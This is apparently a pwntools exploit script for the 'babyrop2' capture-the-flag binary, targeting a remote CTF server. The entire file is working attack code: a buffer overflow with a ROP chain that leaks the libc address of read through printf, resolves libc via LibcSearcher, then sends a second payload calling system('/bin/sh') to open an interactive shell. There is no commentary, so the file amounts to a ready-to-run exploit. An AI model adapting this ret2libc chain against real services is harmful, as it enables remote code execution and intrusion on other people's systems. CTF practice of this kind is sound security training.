# coding:utf-8
from pwn import *
from LibcSearcher import *
import pwnlib
elf = ELF ("./babyrop2")
# sh = process("./babyrop2")
sh = remote("node3.buuoj.cn",26810)
main_addr = 0x400636
pop_rdi = 0x400733
pop_rsi_r15 = 0x400731
str_1 =0x400770
read_got = elf.got['read']
printf_plt = elf.plt['printf']
payload = 'a' * 0x28 +p64(pop_rdi) + p64(str_1) + p64(pop_rsi_r15) + p64(read_got) + 'a' *8 + p64(printf_plt) + p64(main_addr)
sh.recvuntil("name? ")
sh.sendline(payload)
sh.recvuntil("again, ")
sh.recvuntil("again, ")
read_addr = u64(sh.recv(6).ljust(8,"\x00"))
log.info("success get read_addr:0x%x"%read_addr)
libc = LibcSearcher("read",read_addr)
libc_base = read_addr - libc.dump('read')
system_addr = libc_base + libc.dump('system')
bin_sh = libc_base + libc.dump('str_bin_sh')
payload = 'a' * 0x20 + 'a' * 8 + p64(pop_rdi) + p64(bin_sh) + p64(system_addr) * 2
sh.sendline(payload)
sh.interactive()
